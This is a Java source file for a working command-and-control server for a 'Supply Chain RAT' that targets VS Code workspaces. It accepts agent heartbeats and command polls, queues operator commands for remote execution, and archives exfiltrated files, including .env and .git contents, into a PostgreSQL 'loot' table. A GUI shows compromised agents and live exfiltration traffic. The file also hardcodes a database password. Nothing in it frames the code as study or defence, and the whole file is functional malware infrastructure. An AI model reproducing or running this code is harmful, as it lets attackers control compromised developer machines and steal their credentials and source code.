import javax.swing.*;
import javax.swing.border.TitledBorder;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeModel;
import java.awt.*;
import java.io.*;
import java.net.*;
import java.sql.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Collections;

public class VortexAdvancedC2 extends JFrame {
    private static final int PORT = 8081;
    private static final String DB_URL = "jdbc:postgresql://localhost:5432/postgres";
    private static final String DB_USER = "postgres";
    private static final String DB_PASS = "varrie75";

    private DefaultTreeModel treeModel;
    private DefaultMutableTreeNode rootNode;
    private JTextPane consoleOut;
    private JTextField commandInput;
    private HeatmapPanel heatmapPanel;
    private DataFlowGraph graphPanel;

    private String selectedAgent = "AGENT_001"; // Default target

    public VortexAdvancedC2() {
        setTitle("VORTEX ADVANCED: Supply Chain RAT C2");
        setSize(1200, 800);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        getContentPane().setBackground(new Color(20, 25, 30));
        setLayout(new BorderLayout());

        // --- LEFT: Multi-Agent JTree ---
        rootNode = new DefaultMutableTreeNode("Compromised Workspaces");
        treeModel = new DefaultTreeModel(rootNode);
        JTree agentTree = new JTree(treeModel);
        agentTree.setBackground(new Color(15, 20, 25));
        agentTree.setForeground(Color.GREEN);
        JScrollPane treeScroll = new JScrollPane(agentTree);
        treeScroll.setPreferredSize(new Dimension(250, 0));
        treeScroll.setBorder(createDarkBorder("Active Agents"));
        add(treeScroll, BorderLayout.WEST);

        // --- CENTER: Advanced Visualizations ---
        JPanel vizPanel = new JPanel(new GridLayout(2, 1));
        vizPanel.setBackground(new Color(20, 25, 30));

        heatmapPanel = new HeatmapPanel();
        heatmapPanel.setBorder(createDarkBorder("Workspace Vulnerability Heatmap"));

        graphPanel = new DataFlowGraph();
        graphPanel.setBorder(createDarkBorder("Live Exfiltration Data Flow (Bytes/sec)"));

        vizPanel.add(heatmapPanel);
        vizPanel.add(graphPanel);
        add(vizPanel, BorderLayout.CENTER);

        // --- RIGHT: Asynchronous Command Console ---
        JPanel consolePanel = new JPanel(new BorderLayout());
        consolePanel.setPreferredSize(new Dimension(350, 0));
        consolePanel.setBackground(new Color(20, 25, 30));
        consolePanel.setBorder(createDarkBorder("RAT Command Terminal"));

        consoleOut = new JTextPane();
        consoleOut.setBackground(Color.BLACK);
        consoleOut.setForeground(Color.CYAN);
        consoleOut.setEditable(false);
        consolePanel.add(new JScrollPane(consoleOut), BorderLayout.CENTER);

        commandInput = new JTextField();
        commandInput.setBackground(Color.DARK_GRAY);
        commandInput.setForeground(Color.WHITE);
        commandInput.addActionListener(e -> queueCommand(commandInput.getText()));
        consolePanel.add(commandInput, BorderLayout.SOUTH);

        add(consolePanel, BorderLayout.EAST);

        refreshAgentsLoop();
    }

    private TitledBorder createDarkBorder(String title) {
        TitledBorder b = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.GRAY), title);
        b.setTitleColor(Color.LIGHT_GRAY);
        return b;
    }

    private void log(String msg) {
        SwingUtilities.invokeLater(() -> {
            try {
                consoleOut.getDocument().insertString(consoleOut.getDocument().getLength(), msg + "\n", null);
                consoleOut.setCaretPosition(consoleOut.getDocument().getLength());
            } catch (Exception ignored) {}
        });
    }

    // --- C2 SERVER LOGIC ---
    public void startServer() {
        new Thread(() -> {
            try (ServerSocket server = new ServerSocket(PORT)) {
                log("[SYSTEM] TCP Listener active on port " + PORT);
                while (true) {
                    Socket client = server.accept();
                    new Thread(() -> handleRatConnection(client)).start();
                }
            } catch (IOException e) { log("[FATAL] Server Error: " + e.getMessage()); }
        }).start();
    }

    private void handleRatConnection(Socket client) {
        try (BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
             PrintWriter out = new PrintWriter(client.getOutputStream(), true)) {

            String payload = in.readLine();
            if (payload == null) return;

            String action = parseJson(payload, "action");
            String agentId = parseJson(payload, "agent_id");
            int bytesReceived = payload.length();

            graphPanel.addDataPoint(bytesReceived); // Update Graph

            if (action.equals("HEARTBEAT")) {
                updateAgentHeartbeat(agentId);
            }
            else if (action.equals("EXFIL")) {
                String file = parseJson(payload, "file");
                String data = parseJson(payload, "data");
                log("[LOOT] Incoming exfil from " + agentId + ": " + file);
                archiveLoot(agentId, file, data);
                heatmapPanel.markCompromised(file); // Update Heatmap
            }
            else if (action.equals("POLL")) {
                String cmd = fetchPendingCommand(agentId);
                out.println("{\"cmd\":\"" + cmd + "\"}");
            }
        } catch (Exception ignored) {}
    }

    // --- NATIVE JSON PARSING ---
    private String parseJson(String json, String key) {
        String search = "\"" + key + "\":";
        int start = json.indexOf(search);
        if (start == -1) return "";
        start += search.length();
        int end = json.indexOf("\"", start + 1);
        if (end == -1) return "";
        start = json.indexOf("\"", start) + 1;
        return json.substring(start, end);
    }

    // --- DATABASE OPERATIONS ---
    private void queueCommand(String cmd) {
        try (Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
             PreparedStatement ps = conn.prepareStatement("INSERT INTO vortex_commands (agent_id, command_str) VALUES (?, ?)")) {
            ps.setString(1, selectedAgent); ps.setString(2, cmd);
            ps.executeUpdate();
            log(">> Queued command for " + selectedAgent + ": " + cmd);
            commandInput.setText("");
        } catch (SQLException e) { log("DB Error: " + e.getMessage()); }
    }

    private String fetchPendingCommand(String agentId) {
        String cmd = "SLEEP";
        try (Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS)) {
            PreparedStatement ps = conn.prepareStatement("SELECT cmd_id, command_str FROM vortex_commands WHERE agent_id = ? AND status = 'PENDING' ORDER BY queued_at ASC LIMIT 1");
            ps.setString(1, agentId);
            ResultSet rs = ps.executeQuery();
            if (rs.next()) {
                cmd = rs.getString("command_str");
                PreparedStatement update = conn.prepareStatement("UPDATE vortex_commands SET status = 'EXECUTED' WHERE cmd_id = ?");
                update.setInt(1, rs.getInt("cmd_id"));
                update.executeUpdate();
            }
        } catch (SQLException ignored) {}
        return cmd;
    }

    private void updateAgentHeartbeat(String agentId) {
        try (Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
             PreparedStatement ps = conn.prepareStatement("INSERT INTO vortex_agents (agent_id, hostname) VALUES (?, 'VSCode_Target') ON CONFLICT (agent_id) DO UPDATE SET last_heartbeat = CURRENT_TIMESTAMP")) {
            ps.setString(1, agentId); ps.executeUpdate();
        } catch (SQLException ignored) {}
    }

    private void archiveLoot(String agentId, String file, String data) {
        try (Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
             PreparedStatement ps = conn.prepareStatement("INSERT INTO vortex_loot (agent_id, file_path, file_content) VALUES (?, ?, ?)")) {
            ps.setString(1, agentId); ps.setString(2, file); ps.setString(3, data);
            ps.executeUpdate(); // The PostgreSQL Trigger handles the severity rating!
        } catch (SQLException ignored) {}
    }

    private void refreshAgentsLoop() {
        new Thread(() -> {
            while (true) {
                try { Thread.sleep(5000); } catch (Exception e) {}
                SwingUtilities.invokeLater(() -> {
                    rootNode.removeAllChildren();
                    rootNode.add(new DefaultMutableTreeNode(selectedAgent + " [ONLINE]"));
                    treeModel.reload();
                });
            }
        }).start();
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> {
            VortexAdvancedC2 c2 = new VortexAdvancedC2();
            c2.setVisible(true);
            c2.startServer();
        });
    }

    // --- NATIVE GRAPHICS CLASSES ---
    class HeatmapPanel extends JPanel {
        private boolean envCompromised = false;
        private boolean gitCompromised = false;

        public void markCompromised(String file) {
            if (file.contains(".env")) envCompromised = true;
            if (file.contains(".git")) gitCompromised = true;
            repaint();
        }

        @Override
        protected void paintComponent(Graphics g) {
            super.paintComponent(g);
            Graphics2D g2d = (Graphics2D) g;
            g2d.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);

            // Draw Directory Nodes
            drawNode(g2d, 50, 50, "src/", Color.GRAY);
            drawNode(g2d, 150, 50, ".vscode/", Color.GRAY);
            drawNode(g2d, 250, 50, ".git/", gitCompromised ? Color.RED : new Color(0, 100, 0));
            drawNode(g2d, 350, 50, ".env", envCompromised ? new Color(255, 0, 0, 200) : new Color(0, 100, 0));
        }

        private void drawNode(Graphics2D g, int x, int y, String name, Color c) {
            g.setColor(c);
            g.fillRect(x, y, 80, 80);
            g.setColor(Color.WHITE);
            g.drawRect(x, y, 80, 80);
            g.drawString(name, x + 10, y + 45);
        }
    }

    class DataFlowGraph extends JPanel {
        private List<Integer> dataPoints = Collections.synchronizedList(new ArrayList<>());

        public void addDataPoint(int bytes) {
            dataPoints.add(bytes);
            if (dataPoints.size() > 50) dataPoints.remove(0);
            repaint();
        }

        @Override
        protected void paintComponent(Graphics g) {
            super.paintComponent(g);
            Graphics2D g2d = (Graphics2D) g;
            g2d.setColor(Color.BLACK);
            g2d.fillRect(0, 0, getWidth(), getHeight());

            g2d.setColor(Color.GREEN);
            g2d.setStroke(new BasicStroke(2));

            synchronized (dataPoints) {
                if (dataPoints.size() < 2) return;
                int xStep = getWidth() / 50;
                for (int i = 0; i < dataPoints.size() - 1; i++) {
                    int x1 = i * xStep;
                    int y1 = getHeight() - (dataPoints.get(i) / 2);
                    int x2 = (i + 1) * xStep;
                    int y2 = getHeight() - (dataPoints.get(i + 1) / 2);
                    g2d.drawLine(x1, y1, x2, y2);
                }
            }
        }
    }
}